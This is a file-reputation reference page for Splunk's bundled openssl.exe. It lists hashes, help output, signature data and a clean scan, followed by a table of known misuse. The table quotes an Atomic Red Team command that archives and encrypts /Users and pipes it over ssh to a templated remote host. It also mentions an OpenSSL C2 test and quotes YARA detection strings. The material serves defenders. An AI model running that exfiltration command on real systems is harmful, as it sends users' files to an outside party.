---
title: openssl.exe | 
excerpt: What is openssl.exe?
---

# openssl.exe 

* File Path: `C:\Program Files\SplunkUniversalForwarder\bin\openssl.exe`

## Hashes

Type | Hash
-- | --
MD5 | `FBF60742D46DE6C04F506CDB7D3F7FD6`
SHA1 | `65940DB016197D268FA18573FB420689480E2F43`
SHA256 | `2B383F78E3A8E0B74D0B762D614C2A40C32BED79BDF0466E7F662DB58DBF903D`
SHA384 | `2D73ED1688EFAD3AD5B08D7D25D0067A56214E7694E009006BC89FC1AB819E4D2C09E5CC9C2AF8068FFE94A795395A7D`
SHA512 | `AB77E01B1056A423764A69BC8644877A8A471D552874A6EE3C3EE32ADB7F3B6F2A6740E8A88D4D508B960A02412B7B28046A7DEA142B466C7CDE9384CB8C4499`
SSDEEP | `12288:xM6guHKhdUo2KSvxkZDR23DLPmGztVmo1W:y6guqQo21qZ83DLuEmo1W`
IMP | `CB88C9250777F7D69D9363208FF7B69F`
PESHA1 | `ED4E2B457B8CF5BBEF28446E4B2F670ADF5A6981`
PE256 | `D6FF5230F25E4BF23486FB2BB2797E1C2DC210C217AA0A29A4E2A6BF425E7363`

## Runtime Data

### Usage (stderr):
```cmhg
WARNING: can't open config file: C:\\jnkns\\workspace\\build-home/ssl/openssl.cnf
openssl:Error: '--help' is an invalid command.

Standard commands
asn1parse         ca                ciphers           cms               
crl               crl2pkcs7         dgst              dh                
dhparam           dsa               dsaparam          ec                
ecparam           enc               engine            errstr            
gendh             gendsa            genpkey           genrsa            
nseq              ocsp              passwd            pkcs12            
pkcs7             pkcs8             pkey              pkeyparam         
pkeyutl           prime             rand              req               
rsa               rsautl            s_client          s_server          
s_time            sess_id           smime             speed             
spkac             srp               ts                verify            
version           x509              

Message Digest commands (see the `dgst' command for more details)
md4               md5               rmd160            sha               
sha1              

Cipher commands (see the `enc' command for more details)
aes-128-cbc       aes-128-ecb       aes-192-cbc       aes-192-ecb       
aes-256-cbc       aes-256-ecb       base64            bf                
bf-cbc            bf-cfb            bf-ecb            bf-ofb            
camellia-128-cbc  camellia-128-ecb  camellia-192-cbc  camellia-192-ecb  
camellia-256-cbc  camellia-256-ecb  cast              cast-cbc          
cast5-cbc         cast5-cfb         cast5-ecb         cast5-ofb         
des               des-cbc           des-cfb           des-ecb           
des-ede           des-ede-cbc       des-ede-cfb       des-ede-ofb       
des-ede3          des-ede3-cbc      des-ede3-cfb      des-ede3-ofb      
des-ofb           des3              desx              rc2               
rc2-40-cbc        rc2-64-cbc        rc2-cbc           rc2-cfb           
rc2-ecb           rc2-ofb           rc4               rc4-40            
seed              seed-cbc          seed-cfb          seed-ecb          
seed-ofb          zlib              


```

### Loaded Modules:

Path |
-- |
C:\Program Files\SplunkUniversalForwarder\bin\openssl.exe |
C:\Windows\System32\KERNEL32.DLL |
C:\Windows\System32\KERNELBASE.dll |
C:\Windows\SYSTEM32\ntdll.dll |


## Signature

* Status: Signature verified.
* Serial: `014E132916D610BB301B22ABBD994616`
* Thumbprint: `B8B4F0D3FD0571E184DEBB76A1F6DB73F30FA233`
* Issuer: CN=DigiCert EV Code Signing CA (SHA2), OU=www.digicert.com, O=DigiCert Inc, C=US
* Subject: CN="Splunk, Inc.", O="Splunk, Inc.", L=San Francisco, S=California, C=US, SERIALNUMBER=4109614, OID.2.5.4.15=Private Organization, OID.1.3.6.1.4.1.311.60.2.1.2=Delaware, OID.1.3.6.1.4.1.311.60.2.1.3=US

## File Metadata

* Original Filename: 
* Product Name: 
* Company Name: 
* File Version: 
* Product Version: 
* Language: 
* Legal Copyright: 
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/73
* VirusTotal Link: https://www.virustotal.com/gui/file/2b383f78e3a8e0b74d0b762d614c2a40c32bed79bdf0466e7f662db58dbf903d/detection


## Possible Misuse

*The following table contains possible examples of `openssl.exe` being misused. While `openssl.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[malware-ioc](https://github.com/eset/malware-ioc) | [windigo_signatures.pl](https://github.com/eset/malware-ioc/blob/master/sshdoor/windigo_signatures.pl) | `"openssl enc -d -des-ede3-cbc -in $sd[3] -K $k -iv '' 2>/dev/null \|"`{:.highlight .language-cmhg} | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #4: Encrypt files using openssl (Linux) [linux] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #1: OpenSSL C2 [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [linux-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/linux-index.md) | - Atomic Test #4: Encrypt files using openssl (Linux) [linux] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #1: OpenSSL C2 [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1048.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048/T1048.md) | tar czpf - /Users/* \| openssl des3 -salt -pass #{password} \| ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc' | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1486.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1486/T1486.md) | - [Atomic Test #4 - Encrypt files using openssl (Linux)](#atomic-test-4---encrypt-files-using-openssl-linux) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1486.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1486/T1486.md) | ## Atomic Test #4 - Encrypt files using openssl (Linux) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1486.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1486/T1486.md) | Uses openssl to encrypt a file | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1486.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1486/T1486.md) | ##### Description: Finds where openssl is located | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1486.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1486/T1486.md) | which_openssl=`which openssl` | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1553.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.004/T1553.004.md) | Creates a root CA with openssl | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1553.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.004/T1553.004.md) | openssl genrsa -out #{key_filename} 4096 | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1553.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.004/T1553.004.md) | openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1553.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.004/T1553.004.md) | if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi; | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1573.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1573/T1573.md) | - [Atomic Test #1 - OpenSSL C2](#atomic-test-1---openssl-c2) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1573.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1573/T1573.md) | ## Atomic Test #1 - OpenSSL C2 | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1573.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1573/T1573.md) | https://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926 | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_apt28_drovorub.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_apt28_drovorub.yar) | description = "Rule to detect statically linked POCO and OpenSSL libraries (COULD be Drovorub related and should be further investigated)" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_apt28_drovorub.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_apt28_drovorub.yar) | $s3 = "OpenSSL" ascii wide  | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_dubnium.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_dubnium.yar) | $s2 = "OpenSSL: FATAL" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_eqgrp_apr17.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_eqgrp_apr17.yar) | $x1 = "rsakey_txt = lo_execute('openssl genrsa 2048 2> /dev/null \| openssl rsa -text 2> /dev/null')" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_eqgrp_apr17.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_eqgrp_apr17.yar) | $x2 = "client_auth = binascii.hexlify(lo_execute('openssl rand 16'))" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_sofacy.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_sofacy.yar) | $x1 = "c:\\Users\\user\\Desktop\\openssl-1.0.1e_m\\/ssl/cert.pem" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_sofacy_xtunnel_bundestag.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_sofacy_xtunnel_bundestag.yar) | $mix9 = "OpenSSL 1.0.1e 11 Feb 2013" $mix10 = "Xtunnel.exe" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [vul_cve_2021_386471_omi.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/vul_cve_2021_386471_omi.yar) | // older versions are no longer supported by current openssl | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)



MIT License. Copyright (c) 2020-2021 Strontic.


